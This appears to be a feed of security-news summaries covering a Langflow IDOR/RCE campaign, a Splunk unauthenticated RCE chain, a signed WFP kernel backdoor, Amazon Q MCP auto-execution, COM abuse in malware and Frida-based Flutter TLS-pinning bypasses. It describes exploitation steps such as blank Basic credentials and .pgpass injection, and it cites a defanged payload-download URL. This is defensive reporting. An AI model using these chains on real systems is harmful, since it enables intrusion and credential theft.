- The IDOR chain: operator called GET /api/v1/flows/ 20 seconds before the exploit, harvested the disclosed UUIDs, then replayed them to POST /api/v1/responses with input "leak api keys". The flaw is in get_flow_by_id_or_endpoint_name (helpers/flow.py), which skips user_id ownership checks on the UUID path. Fixed in Langflow 1.9.1 (PR).
- The RCE payloads injected a custom Langflow component that shelled out to fetch and run hxxp://45.207.216[.]55:8084/slt, dropping a second-stage implant to /tmp/lang_pwn. The operator ran five RCE waves versus one IDOR pass, proving effort allocation tracks yield, not CVSS rank.

item.title: Critical Unauthenticated Remote Code Execution in Splunk Enterprise (CVE-2026-20253)
item.description:
CVE-2026-20253 (CVSS 9.8): Unauthenticated RCE in Splunk Enterprise is under active exploitation. Attackers reach an internal PostgreSQL sidecar recovery endpoint through the Splunk Web proxy with no credentials required.
Key findings:
- The root cause is Splunk Web proxying requests to /en-US 🇺🇸/splunkd/__raw/v1/postgres/recovery/backup, which forwards to a PostgreSQL sidecar listening on 127.0.0.1:5435. Any Authorization: Basic header, including blank credentials (Og==), is accepted. Affected versions: 10.2.x prior to 10.2.4 and 10.0.x prior to 10.0.7. Splunk Cloud and 9.4 and earlier are not affected.
- The five-step chain: unauthenticated POST to the backup endpoint, path traversal via the backupFile parameter to create or truncate arbitrary files, connection string injection to point pg_dump at an attacker-controlled database, credential theft by injecting passfile=/opt/splunk/var/packages/data/postgres/.pgpass to harvest the postgres_admin password, then overwriting a scheduled Python script such as ssg_enable_modular_input.py to execute code as the Splunk service account.
- Post-exploitation impact is severe given Splunk's role: log tampering, alert suppression, credential and API key harvesting from indexed events, persistence, and lateral movement using the service account's network position.
- CISA added CVE-2026-20253 to KEV on June 18, 2026 with a BOD 26-04 federal remediation deadline of June 21. Patch immediately.

item.title: Anatomy of a WHQL-Signed Windows Filtering Platform (WFP) Kernel-Resident Network Backdoor
item.description:
A WHQL-signed kernel driver from China 🇨🇳 embeds a complete network backdoor using Windows Filtering Platform, with no user-mode agent, no IOCTL interface, and no disk artifacts beyond the .sys file itself.
Key findings:
- wskmon.sys (SHA-256: 495c7e5513fa7766c236e76d8520139139fc4ad7203ddcb2ccdae17bdb691979) registers a WFP stream callout via FwpsCalloutRegister1 to intercept all inbound TCP traffic, recognizing commands by magic bytes 7F 4E 54 46 in raw TCP or HTTP POST bodies. It supports three handlers: 0x01 shell execution as SYSTEM, 0x02 arbitrary kernel-mode file write bypassing all ACLs, and 0x03 shellcode injection.
- Commands are HMAC-SHA256 authenticated with a hardcoded 256-bit key, then XOR-decrypted, eliminating unauthorized injection. The driver runs entirely autonomously after load, with no user-mode relay to intercept.
- Shell commands inject into a Session 0 svchost.exe via KeStackAttachProcess and RtlCreateUserThread. The forensic tell: child processes like cmd.exe or notepad.exe parented to svchost.exe in Session 0 with no interactive window.
- Signed April 17, 2026 by 深圳市奥联信息安全技术有限公司, first seen on VirusTotal June 15, 2026 from China 🇨🇳. The valid WHQL signature bypasses driver integrity checks including Secure Boot.

item.title: MCP Auto-Execution: From Git Clone to Cloud Compromise in Amazon Q VS Code Extension
item.description:
Amazon Q VS Code extension auto-executed MCP server configs on repo open, enabling arbitrary code execution and AWS credential theft with no user interaction beyond cloning a malicious repo.
Key findings:
- Amazon Q loaded .amazonq/mcp.json from the workspace root automatically when a folder was opened, with no consent prompt, no workspace trust check, and no visible indicator. Combined with full shell environment inheritance, any command in that config ran immediately with the developer's active cloud credentials in scope.
- Proof of concept used aws sts get-caller-identity to capture the victim's live AWS session. Escalation paths include backdooring IAM users, pivoting via inherited VPN context, and supply chain attacks targeting maintainers of popular repos. Social engineering via fake coding interviews (a documented DPRK 🇰🇵 tactic) is a realistic delivery vector.
- This is a systemic pattern, not an isolated bug. Related CVEs hit Claude Code (CVE-2025-59536, CVE-2026-21852), Cursor (CVE-2025-54136), and Windsurf (CVE-2026-30615). Any AI coding tool that auto-processes workspace configs is a candidate for this class of issue.
- Fixed in Amazon Q language server version 1.65.0, which adds an "Untrusted MCP Server" consent prompt. Most installs update automatically; reload the IDE to confirm. Audit repos for unexpected .amazonq/ directories and review any MCP configs already present in your environment.

item.description:

item.description:

item.title: From Code to Coverage (Part 6): What netlogon.log Sees That Event 1644 Never Will
item.description:

No registry key or verbosity setting changes this. Zero Event 1644 entries in lab testing across 40 usernames.

The attacker sees identical misses for disabled and nonexistent accounts. The DC and the log do not. Source IP shows (null) in all cases.

item.title: Introduction to COM usage by Windows threats
item.description:
COM abuse is a persistent blind spot in triage: Qakbot, Attor, WarmCookie, and Gh0stRAT all weaponize Windows COM interfaces to hide behavior behind vtable indirection, evade EDR telemetry, and achieve persistence without touching schtasks.exe.
Key findings:
- COM hides attacker intent behind indirect vtable calls like "call qword ptr [rax+38h]". Until you recover the interface type and apply it in IDA or Binary Ninja, WMI access, BITS transfers, and scheduled task creation are invisible. Qakbot uses CoInitializeSecurity then CoCreateInstance with IID_IWbemLocator to reach WMI. Attor uses IBackgroundCopyJob for C2 and exfiltration over BITS, the same service Windows Update uses.

- DCOM lateral movement (T1021.003) is fingerprinted by CoCreateInstanceEx with remote COSERVERINFO parameters. CoInitializeSecurity and CoSetProxyBlanket calls signal the sample is configuring impersonation for out-of-process or remote COM use.
Takeaway: In IDA, apply ITaskServiceVtbl, IWbemLocatorVtbl, or IBackgroundCopyJobVtbl to recovered interface pointers, then use the COM Helper plugin or COMIDA to rename GUID references.

item.title: I Wasted 3 Days Intercepting a Flutter App. Here’s What Actually Works.
item.description:
Flutter apps silently block proxy interception because BoringSSL bypasses Android's certificate trust chain entirely. Three days of failed attempts led to a two-script Frida solution covering every TLS validation layer at once.
Key findings:
- Flutter ships its own TLS stack via BoringSSL compiled into libflutter.so, completely ignoring Android's system CA store. Installing Burp's CA through device Settings has zero effect. ReFlutter patches only the Flutter binary and misses any Java or WebView connectivity checks that run before Dart initializes.
- disable-flutter-tls-v1.js finds ssl_verify_peer_cert in libflutter.so via byte pattern matching across arm64, arm, x64, and x86, then replaces it with a stub returning 0. A retry loop with five one-second delays handles the common silent failure where Frida attaches before libflutter.so finishes loading.
- universal_bypass.js covers the Java layer: custom X509TrustManager, SSLContext hook, HostnameVerifier, WebViewClient, and crucially InAppWebViewClient at com.pichillilorenzo.flutter_inappwebview_android.webview.in_app_webview.InAppWebViewClient. That last hook was missing from every existing script and is the reason WebView traffic stays blocked even when everything else works.
- When scripts alone are not enough: iptables DNAT redirects port 443/80 to Burp at kernel level since Flutter ignores Android proxy settings.
